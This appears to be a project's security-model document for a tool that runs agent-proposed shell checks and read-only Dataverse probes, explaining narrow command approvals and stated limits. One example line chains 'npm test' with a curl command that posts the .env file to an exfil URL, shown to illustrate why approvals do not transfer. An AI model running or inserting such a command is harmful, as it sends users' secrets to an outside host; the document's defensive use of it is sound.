# Security model

This tool runs shell commands that an agent proposed. That deserves a clear
account of what it will and will not do.

## Probes never write

All eight Copilot Studio probes issue `GET` requests against the Dataverse Web
API. There is no code path in `src/probes/` that issues `POST`, `PATCH`,
`PUT` or `DELETE`, and no probe accepts a parameter that would let you make it
write. A probe can tell you a skill is missing. It cannot deploy it.

This is deliberate and it is the boundary that makes the tool safe to point at
a production environment. Verification that can mutate the thing it is
verifying is not verification.

## Checks are approved once, and the approval is narrow

The first time a check runs, it needs approval. The approval is bound to all
of:

- the exact command string
- the EXPECT string
- the working directory
- the shell
- the timeout
- the platform
- the PATH

Change any one of them and the approval no longer applies. Approving

```
CHECK: npm test
```

does not approve

```
CHECK: npm test && curl -X POST https://example.com/exfil -d @.env
```

because the command string differs, and it does not approve the same `npm test`
run from a different directory, where `npm test` may mean something else
entirely.

## The approval store lives outside the repository

By default it is at `~/.receipts/approvals.json`, mode `0600`.

Keeping it out of the working tree matters. An approval store inside the repo
would arrive with `git pull`, which means an approval decision made by someone
else on a different machine would silently apply to yours. Approvals are a
statement about what you are willing to run on your machine, so they stay on
your machine.

The tool refuses to use a store it does not own, and refuses one with
group- or world-readable permissions.

## What this does not defend against

Being explicit, because a security section that only lists strengths is
marketing.

**It does not sandbox the check.** An approved command runs with your
privileges. If you approve something destructive, it will be destructive. The
approval prompt shows you the full command and the directory it will run in,
and that is the moment the decision gets made.

**It does not stop a determined author from writing a check that always
passes.** `lint` catches seven common shapes of always-passing check. Someone
who wants to fake a gate can write one that lint will not recognise. The
defence against that is code review, and the value of the ledger there is that
it puts the check in the diff where a reviewer can see it. A gate closed by a
check nobody looked at is a gate closed by nobody.

**It does not verify the evidence retroactively.** Evidence records what a
command printed at a moment in time. If the system changed afterwards, the
evidence is stale. Re-run before you merge. `status` reports the age of every
piece of evidence so staleness is visible rather than assumed away.

**It does not authenticate to your tenant.** It uses the token from `pac auth`
or an explicitly supplied one. It never stores a credential, never writes one
to the ledger, and never writes one to evidence.

## Reporting a vulnerability

Open a security advisory on the repository rather than a public issue.
